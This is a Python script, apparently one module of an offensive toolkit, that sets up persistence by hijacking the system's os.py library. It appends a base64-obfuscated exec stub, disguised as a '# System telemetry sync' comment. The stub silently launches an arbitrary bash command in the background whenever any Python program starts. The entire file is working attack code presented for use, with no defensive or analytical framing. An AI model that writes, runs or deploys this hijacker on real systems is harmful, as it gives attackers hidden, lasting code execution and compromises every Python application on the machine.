#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import base64
import subprocess

class PythonLibraryHijacker:
    """
    Agent 209: Application-Layer Persistence.
    Injects a background trigger into a standard Python library 
    to ensure execution whenever Python applications are initialized.
    """
    def __init__(self, payload_cmd):
        self.payload = payload_cmd
        # We target 'os.py' because it is imported by almost everything
        self.target_file = os.__file__

    def _generate_trigger(self):
        """Creates a non-blocking background execution stub."""
        # Wrap the shell command in a sub-process call
        raw_code = f"import subprocess; subprocess.Popen(['bash', '-c', '{self.payload}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
        encoded_code = base64.b64encode(raw_code.encode()).decode()
        
        # The injection string: decodes and executes the payload silently
        return f"\n# System telemetry sync\nimport base64 as _b64; exec(_b64.b64decode('{encoded_code}'))\n"

    def execute(self):
        print(f"--- [AGENT 209: PYTHON LIBRARY HIJACKING] ---")
        
        if not os.access(self.target_file, os.W_OK):
            print(f"[!] Error: No write access to {self.target_file}. Root may be required.")
            return False

        try:
            trigger = self._generate_trigger()
            
            with open(self.target_file, 'r') as f:
                content = f.read()
                if "System telemetry sync" in content:
                    print("[+] Library already patched. Skipping.")
                    return True

            # Append the trigger to the end of the library file
            with open(self.target_file, 'a') as f:
                f.write(trigger)
            
            print(f"[!!!] HIJACK SUCCESSFUL: {self.target_file} patched with persistence.")
            return True
        except Exception as e:
            print(f"[!] Hijack Failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py '<command_to_run>'")
        sys.exit(1)
    
    PythonLibraryHijacker(sys.argv[1]).execute()
